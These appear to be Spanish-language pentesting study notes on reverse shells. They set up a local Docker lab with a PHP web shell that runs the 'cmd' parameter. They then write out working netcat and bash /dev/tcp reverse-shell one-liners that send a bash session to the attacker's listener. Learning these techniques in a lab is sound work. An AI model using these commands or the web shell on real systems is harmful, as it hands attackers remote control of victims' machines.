---
tags:
  - shell
  - reverse
  - conection
  - TCP/UDP
---
# Indice

- [[#Introducción]]
- [[#Practica]]
- [[#Continuar apuntes]]
# Introducción

La idea es que, al nosotros poder estar ejecutando comandos en la web, nos aprovechemos de ello y lleguemos a inyectar comandos que hagan que la máquina víctima establezca una conexión hacia nosotros como atacantes que estaremos en escucha. 

En esta conexión, la máquina víctima nos enviará una shell, lo cual se le conoce como reverse shell, al ser la propia víctima quien nos la envía y establece la conexión.

Esta comunicación puede darse ya sea por TCP o UDP. Existen diversas formas en las que se pueda dar. Nosotros, para estar en escucha, utilizaremos __netcat__, la máquina víctima puede utilizar lo mismo o, en su defecto, de no ser el caso, existen alternativas, ya sea con la propia terminal bash u otros lenguajes.

![[Conceptos básicos de enumeración y explotación/Shells/images/002.png]]

__nc -nlvp 443__ nos permite como atacantes ponernos en escucha en el puerto 443 por conexiones entrantes. 

__nc -e /bin/bash ipAtacante 443__ nos permite, mediante la ejecución que tenemos de comandos en la máquina víctima, hacer que ejecute una terminal bash, pero la envíe hacia nosotros con nuestra ip y mediante el puerto 443, que es en el que estamos en escucha.

Otra alternativa sin emplear netcat desde el lado de la víctima, ya que luego es muy probable que no tenga instaladas estas herramientas, es utilizar la propia terminal bash con __bash -i >& /dev/tcp/ipAtacante/puerto 0>&1__. 

Alternativas para enviar una reverse shell existen muchísimas; es por ello que uno de los recursos muy buenos que pueden existir es [__reverse shell pentestmonkey__](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Esta página web nos proporciona múltiples maneras de enviarnos una reverse shell con distintos lenguajes.
# Practica 

Construiremos un laboratorio propio con Docker en el cual se ofrezca una página mediante el servicio Apache y almacenaremos en la ruta /var/www/html un script de PHP que nos permitirá efectuar la ejecución de los comandos siempre que el PHP sea interpretado; por ello instalaremos las dependencias necesarias para que así sea.

```PHP
<?
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Lo anterior, al guardarlo en la ruta principal donde se mostrará la web, podremos acceder al recurso. Este script de PHP lo que hace es ejecutar un comando y mostrar el output; lo de "<\pre>" son etiquetas preformateadas para que el output en la web se muestre correctamente formateado y no en una sola línea.

```Dockerfile
FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive

RUN apt update && apt install -y php \
apache2 ncat netcat neovim nano

COPY myphp.php /var/www/html

EXPOSE 80

ENTRYPOINT service apache2 start && /bin/bash
```

Construimos nuestra imagen y ejecutamos nuestro contenedor.

```shell
docker build -t myapp .
docker run --name myContainer -p 80:80 -dit myapp 
```

Veremos cómo ahora ya tenemos una web corriendo:

![[Conceptos básicos de enumeración y explotación/Shells/images/003.png]]

Como tenemos un script en la misma ruta de donde se nos está mostrando esta página de Apache, podremos acceder a este recurso con el nombre; recordemos que nuestro archivo PHP tenía de nombre __myphp.php__:

```url
http://127.0.0.1/myphp.php
```

![[Conceptos básicos de enumeración y explotación/Shells/images/004.png]]

Como vemos, se nos muestra el contenido del archivo como si de un archivo de texto se tratase. Esto significa que el PHP no está siendo interpretado por la máquina víctima; para que esto sea posible, tendremos que modificar una configuración en el archivo php.ini. 

Para ello entramos en nuestro contenedor y nos dirigiremos a la ruta que se muestra a continuación y abriremos el archivo php.ini.

Este archivo se encuentra en la ruta /etc/php/8.3/apache2/php.ini, donde el número __8.3__ es intercambiable por la versión de PHP instalada. 

Abriremos este archivo y buscaremos por __short_open_tag__ y cambiaremos su valor a __On__, una vez hecho esto, guardamos y reiniciamos el servidor.

```shell
service apache2 restart
```

![[Conceptos básicos de enumeración y explotación/Shells/images/005.png]]

Una vez reiniciado el servidor, volvemos a ir al enlace donde apuntamos directamente al recurso de PHP y ahora pasándole el parámetro cmd, veremos cómo al darle un comando nos lo interpreta:

```url
http://127.0.0.1/myphp.php?cmd=whoami
```

![[Conceptos básicos de enumeración y explotación/Shells/images/006.png]]

Por ende, si ahora nosotros en una terminal como atacantes nos ponemos en escucha por el puerto 443:

```shell
nc -lnvp 443
```

Parámetros:

- __l__: Es para ponernos en escucha de conexiones entrantes.
- __n__: Es para que no se aplique resolución DNS, tal como se utiliza en NMAP.
- __v__: Verbose, que es para que nos dé información de conexiones entrantes.
- __p__: Para indicar el puerto en el que nos pondremos en escucha.

Con esto listo, desde el navegador web proveeremos una terminal bash desde la máquina víctima mediante la conexión hacia la máquina atacante; esto lo haremos con netcat, que recordemos en este caso la máquina víctima tiene instalado.

```shell
ncat -e /bin/bash 172.17.0.1 443
```

En este caso, hacia la IP que enviamos la terminal mediante la conexión; es hacia la __172.17.0.1__ debido a que todo esto lo estamos corriendo en un contenedor y la interfaz que maneja nuestra máquina con Docker tiene esta IP. Colocaríamos nuestra IP de la máquina en un entorno real, donde ambas máquinas están en el mismo rango de red y tienen dos IP que pueden comunicarse. 

Si en nuestra máquina realizamos __ifconfig__, veremos cómo esta IP pertenece a la interfaz Docker0 y, si verificamos la IP de nuestro contenedor instalando net-tools, veremos cómo es la 172.17.0.2.

![[Conceptos básicos de enumeración y explotación/Shells/images/007.png]]

![[Conceptos básicos de enumeración y explotación/Shells/images/008.png]]

De esta manera vemos cómo recibimos una conexión desde la máquina víctima, donde si escribimos un comando, veremos el output debido a que recibimos una terminal. Si quisiéramos ver totalmente una interfaz interactiva, tendríamos que lanzar una seudoterminal desde la conexión que ahora tenemos con el comando:

```shell
script /dev/null -c bash
```

![[Conceptos básicos de enumeración y explotación/Shells/images/009.png]]

Con todo esto en mente, ahora sabemos cómo una reverse shell, sin importar el contexto de una web con posibilidad de comandos o directamente tener acceso a la terminal de nuestra víctima, implica el enviarnos a nosotros una terminal ejecutando un comando en la máquina víctima, para poder manejarla de una forma mucho más cómoda, de forma interactiva.

# Continuar apuntes

[[Introducción a Shells]]



